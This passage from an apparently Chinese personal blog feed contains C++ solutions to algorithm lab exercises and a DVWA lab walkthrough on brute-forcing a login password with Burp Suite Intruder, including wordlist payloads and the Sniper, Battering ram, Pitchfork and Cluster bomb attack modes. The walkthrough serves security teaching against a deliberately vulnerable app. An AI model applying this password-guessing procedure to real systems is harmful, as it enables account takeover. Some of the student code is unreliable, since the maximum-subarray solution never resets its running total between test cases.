class="built_in">cin</span>&gt;&gt;chain[i]&gt;&gt;h[i]&gt;&gt;l[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> test[<span class="number">3</span>][<span class="number">105</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;test[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> key;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(test[i][<span class="number">0</span>]==chain[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    key=j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            p[<span class="number">0</span>]=h[key];</span><br><span class="line">            p[<span class="number">1</span>]=l[key];</span><br><span class="line">            <span class="keyword">int</span> len=<span class="built_in">strlen</span>(test[i]);</span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;len;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(test[i][k]==chain[j])</span><br><span class="line">                    &#123;</span><br><span class="line">                        key=j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(p[k]==h[key])</span><br><span class="line">                &#123;</span><br><span class="line">                    p[k+<span class="number">1</span>]=l[key];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"MengMengDa"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                    flag=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;maxchain(len)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-01背包问题"><a href="#问题-C-01背包问题" class="headerlink" title="问题 C: 01背包问题"></a>问题 C: 01背包问题</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>对每组测试数据，输出其对应的所装物品的最大价值。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> w[<span class="number">10010</span>],v[<span class="number">10010</span>],dp[<span class="number">10010</span>];</span><br><span class="line">    <span class="keyword">int</span> t,m,n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=m;j&gt;=w[i];j--)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[j]=max(dp[j],dp[j-w[i]]+v[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=m;i&gt;=<span class="number">2</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i]!=dp[i<span class="number">-1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;dp[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-最大子段和"><a href="#问题-D-最大子段和" class="headerlink" title="问题 D: 最大子段和"></a>问题 D: 最大子段和</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</p><p>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</p><p>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>输出其对应的最大子段和。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><p>子段可为空集，答案为0</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10010</span>];</span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxsum</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            b+=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            b=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(b&gt;sum)</span><br><span class="line">        &#123;</span><br><span class="line">            sum=b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        maxsum(k);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-汽水瓶【25】"><a href="#问题-E-汽水瓶【25】" class="headerlink" title="问题 E: 汽水瓶【25】"></a>问题 E: 汽水瓶【25】</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10</span><br><span class="line">81</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">40</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,sum=<span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&amp;&amp;n!=<span class="number">0</span>)&#123;</span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            sum+=n/<span class="number">3</span>;</span><br><span class="line">            n=(n%<span class="number">3</span>)+(n/<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">2</span>)    sum++;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-Brute_Force暴力破解</title>
      <link href="/2019/10/22/Brute_Force/"/>
      <url>/2019/10/22/Brute_Force/</url>
      
        <content type="html"><![CDATA[<p>利用burpsuite暴力破解DVWA的Brute_Force。</p><a id="more"></a><h3 id="一、配置burpsuite"><a href="#一、配置burpsuite" class="headerlink" title="一、配置burpsuite"></a>一、配置burpsuite</h3><p>打开火狐浏览器，工具栏里找到preferences,找到network proxy,点击settings,填写如下配置</p><p>![<del>`KHUGAWJ8ZXHWWKAC``3</del>S.png](<a href="https://i.loli.net/2019/10/22/dbGx16ywKJ32Y9t.png" target="_blank" rel="noopener">https://i.loli.net/2019/10/22/dbGx16ywKJ32Y9t.png</a>)</p><p><img src="https://i.loli.net/2019/10/22/oag5jxbHnJhIQy8.png" alt="DH136K_XS4P1DIU_UWK7_R5.png"></p><p>打开burpsuite,勾选代理即可</p><p><img src="https://i.loli.net/2019/10/22/zeU52IaT8qSYhpN.png" alt="2KIR_2_A1X2TVG54_Z_@C96.png"></p><p>先关闭proxy里的intercept，先不拦截</p><h3 id="二、寻找注入点"><a href="#二、寻找注入点" class="headerlink" title="二、寻找注入点"></a>二、寻找注入点</h3><p>先进入DVWA页面，安全等级设置位low,再进入暴力破解的页面</p><p><img src="https://i.loli.net/2019/10/22/jEcwLoTW9AgiKdR.png" alt="C0_0_CWB_ISDUO_RCNCS45I.png"></p><p>输入用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></table></figure><p>密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123</span><br></pre></td></tr></table></figure><p>开启burp suite拦截，登陆</p><p><img src="https://i.loli.net/2019/10/22/OjQFxUDV3PBmiuE.png" alt="H_HLQGD19_DF_ODPW_@385T.png"></p><p>选中全部内容，右键发送给intruder</p><p><img src="https://i.loli.net/2019/10/22/TdNYEPaJ9vpGfeK.png" alt="2Y19__1WHZ__RQM@9K__BLX.png"></p><p>点clear清除全部变量，选中123，点add，添加变量</p><p>![O@P_AL@_P1IU`E~MU5A7X_Q.png](<a href="https://i.loli.net/2019/10/22/Opm7XKfaS1otTZE.png" target="_blank" rel="noopener">https://i.loli.net/2019/10/22/Opm7XKfaS1otTZE.png</a>)</p><p>在payloads里添加破解字典</p><p>![0EA__K`9T_QD_WXGC7_1_@S.png](<a href="https://i.loli.net/2019/10/22/837G4kexKdzlRaS.png" target="_blank" rel="noopener">https://i.loli.net/2019/10/22/837G4kexKdzlRaS.png</a>)</p><p>下面就可以攻击了</p><p>burp suite的攻击类型</p><p><img src="https://i.loli.net/2019/10/22/Gm5AEUr6lTiKd2Y.png" alt="5C`_M8L_Q_D_X_AT_`___@J.png"></p><h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p><h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p><h4 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h4><p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p><h4 id="第四种："><a href="#第四种：" class="headerlink" title="第四种："></a>第四种：</h4><p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p><h3 id="三、攻击"><a href="#三、攻击" class="headerlink" title="三、攻击"></a>三、攻击</h3><p>选择sniper攻击方式，开始攻击</p><p>根据攻击结果的length来判断是否成功</p><p><img src="https://i.loli.net/2019/10/22/JFGd3PfibMpaTZ6.png" alt="R_OTHC_P6_X_`_ZWAN_O_`I.png"></p><p>攻击成功，密码为password</p><p>此法适用各个安全等级</p>]]></content>
      
      
      <categories>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法实验（一）</title>
      <link href="/2019/10/22/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C1/"/>
      <url>/2019/10/22/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C1/</url>
      
        <content type="html"><![CDATA[<p>算法实验一。</p><a id="more"></a><h2 id="问题-A-判断字符串是否是手机号码"><a href="#问题-A-判断字符串是否是手机号码" class="headerlink" title="问题 A: 判断字符串是否是手机号码"></a>问题 A: 判断字符串是否是手机号码</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>手机号码是一串数字，长度为11位，并且第一位必须是1，现在给出一个字符串，我们需要判断这个字符串是否符合手机格式。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试数据。每组数据输入一个字符串。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>若该字符串符合手机号码格式，输出1，否则输出0。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345612345</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> b=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]!=<span class="string">'1'</span>||s.length()!=<span class="number">11</span>)</span><br><span class="line">            b=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&lt;<span class="string">'0'</span>||s[i]&gt;<span class="string">'9'</span>)</span><br><span class="line">                b=<span class="number">0</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">             </span><br><span class="line">    &#125;   </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-内部收益率"><a href="#问题-B-内部收益率" class="headerlink" title="问题 B: 内部收益率"></a>问题 B: 内部收益率</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180914/20180914131556_63531.png" alt="img"></p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180914/20180914131642_82198.png" alt="img"></p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">-1 2</span><br><span class="line">2</span><br><span class="line">-8 6 9</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.00</span><br><span class="line">0.50</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> cf[<span class="number">15</span>];</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">double</span> l,r,s,f,m;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;T&amp;&amp;T!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=T;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;cf[i];</span><br><span class="line">        &#125;</span><br><span class="line">        l=<span class="number">-1.0</span>;</span><br><span class="line">        r=<span class="number">1e8</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            s=<span class="number">0</span>;</span><br><span class="line">            f=<span class="number">1.0</span>;</span><br><span class="line">            m=(l+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=T;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                f=f/(<span class="number">1.0</span>+m);</span><br><span class="line">                s=s+cf[j]*f;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s+cf[<span class="number">0</span>]&gt;<span class="number">0</span>)</span><br><span class="line">                l=m;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r=m;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">cout</span>&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;<span 